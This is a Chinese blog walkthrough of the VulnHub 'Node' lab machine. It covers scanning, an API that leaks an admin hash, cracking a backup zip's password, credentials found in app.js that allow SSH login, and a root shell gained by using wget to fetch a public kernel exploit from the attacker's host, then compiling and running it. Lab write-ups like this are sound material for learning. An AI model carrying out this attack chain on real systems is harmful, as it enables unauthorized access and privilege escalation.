---
title: Node 靶机
date: 2021-02-27 10:01:48
categories: security
tags: 
- drone
---

**靶机下载**: [https://www.vulnhub.com/entry/node-1,252/](https://www.vulnhub.com/entry/node-1,252/)

渗透目标是通过 VMWare 安装的 Node 虚拟机, 网络连接方式为仅主机, 目标 IP 通过 DHCP 分配

## 主机发现

```shell
[root@kali ~]# arp-scan -I eth0 -l
```

## 端口探测

```shell
[root@kali ~]# nmap -sS -p1-65535 -v 192.168.64.129
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

<!-- more -->

## 服务识别

```shell
[root@kali ~]# nmap -sV -T4 -p22,3000 192.168.64.129
```

![port_service](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/port_service.png)

## 查找漏洞

### 扫描目录

```shell
[root@kali ~]# dirb http://192.168.64.129:3000 -f ~/web_file_list.txt
```

![scan_web_file](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/scan_web_file.png)

没有扫描到 web 目录

### 使用BurpSuite 探测

获取到 http://192.168.64.129:3000/api/users/latest 中 JSON 格式的用户数据

![api_user](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/api_user.png)

尝试去掉 latest, 在 http://192.168.64.129:3000/api/users/ 中发现了管理员用户

![user_admin](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/user_admin.png)

### 尝试破解密码

```shell
[root@kali ~]# hash-identifier dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
```

SHA-256 在线解密 [https://md5decrypt.net/Sha256/](https://md5decrypt.net/Sha256/)

![online_decrypter](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/online_decrypter.png)

### 用管理员登录

管理员登录后可以下载备份文件

![down_bak](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/down_bak.png)

### 尝试解密备份

文件内容为 ASCII 文本, 预览后疑似 BASE64 编码

```shell
[root@kali ~]# file myplace.backup
myplace.backup: ASCII text, with very long lines, with no line terminators
```

尝试 BASE64 解码, 得到 zip 压缩包, 但是解压需要密码

```shell
[root@kali ~]# cat myplace.backup | bash64 -d > myplace.bak
[root@kali ~]# file myplace.bak
myplace.bak: Zip archive data, at least v1.0 to extract
```

尝试破解压缩包密码

```shell
[root@kali ~]# fcrackzip -v -b -u -c a -p magicaaaa myplace.bak
... ...
PASSWORD FOUND!!!!: pw == magicword
```

解压后寻找可用信息

```shell
[root@kali ~]# unzip myplace.bak
[root@kali ~]# more var/www/myplace/app.js
... ...
const url = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
... ...
```

### 尝试使用 MongoDB 用户 ssh 登录

```shell
[root@kali ~]# ssh mark@192.168.64.129    #密码:5AYRft73VtFpc84k
[mark@node ~]$ uname -a
Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
[mark@node ~]$ cat /etc/issue
Ubuntu 16.04.3 LTS \n \l
```

### 漏洞提权

```shell
[root@kali ~]# searchsploit Ubuntu 16.04
```

发现漏洞提权代码

![ubuntu_sploit](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/node_drone/ubuntu_sploit.png)

将提权代码传到靶机

```shell
[root@kali ~]# systemctl start apache2.service
[root@kali ~]# cp /usr/share/exploitdb/exploits/linux/local/44298.c /var/www/html/
[mark@node /tmp]$ wget http://192.168.64.128/44298.c    
#192.168.64.128 为 Kali 虚拟机 IP
[mark@node /tmp]$ gcc 44298.c -o exp
[mark@node /tmp]$ ./exp
[root@node /tmp]# whoami
root
```

